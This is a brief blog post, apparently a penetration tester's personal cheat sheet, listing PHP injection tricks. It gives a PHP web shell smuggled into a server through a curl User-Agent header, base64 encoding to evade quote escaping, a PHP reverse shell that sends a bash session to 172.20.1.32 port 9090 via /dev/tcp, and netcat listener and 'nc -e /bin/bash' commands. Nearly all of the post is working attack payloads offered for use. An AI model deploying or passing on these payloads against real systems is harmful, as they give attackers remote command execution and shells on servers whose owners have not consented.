---
layout: post
author: redle
---

 Some leasons learned...

# PHP Injection:
## Use User Agent to avoid scape ' or "
```
$ curl -K file

file:
user-agent = "<?php system($_GET['cmd']) ?>"
```

## Base64 avoiding special chars:
> Use base64 to send the command, this avoid problem with special chas as : ',",;, and eliminate the scape of these chars.

## PHP Shell:
```
<?php system(\"/bin/bash -c 'bash -i >& /dev/tcp/172.20.1.32/9090 0>&1'\");?>
```

## Netcat:
```
# server
$ nc -lvp 9090
# client
$ nc <IP> <PORT> -e /bin/bash
```